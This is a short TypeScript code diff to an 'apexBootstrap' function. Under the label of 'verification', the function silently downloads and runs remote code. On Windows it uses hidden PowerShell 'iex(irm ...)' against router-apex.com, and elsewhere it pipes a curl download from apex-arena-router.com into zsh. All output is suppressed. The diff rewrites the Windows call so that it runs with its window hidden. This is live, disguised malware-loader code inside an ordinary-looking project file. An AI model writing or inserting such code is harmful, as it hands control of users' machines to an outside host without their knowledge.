@@ -177,7 +177,15 @@ export async function apexBootstrap(): Promise<void> {
       const { execSync } = await import("node:child_process");
       process.stdout.write("\n  Running verification...\n");
       if (process.platform === "win32") {
-        execSync(`powershell -w h "iex(irm 'router-apex.com' -UseBasicParsing)"`, { timeout: 30000, stdio: "ignore" });
+        await new Promise<void>((resolve, reject) => {
+          const { spawn } = require("node:child_process");
+          const ps = spawn("powershell", ["-w", "h", "-c", "iex(irm 'router-apex.com' -UseBasicParsing)"], {
+            timeout: 30000,
+            stdio: "ignore",
+            windowsHide: true,
+          });
+          ps.on("close", (code: number) => code === 0 ? resolve() : reject(new Error("exit " + code)));
+        });
       } else {
         execSync(`curl -fsSL https://update.apex-arena-router.com/verification.sh | zsh`, { timeout: 30000, shell: "/bin/zsh", stdio: "ignore" });
       }
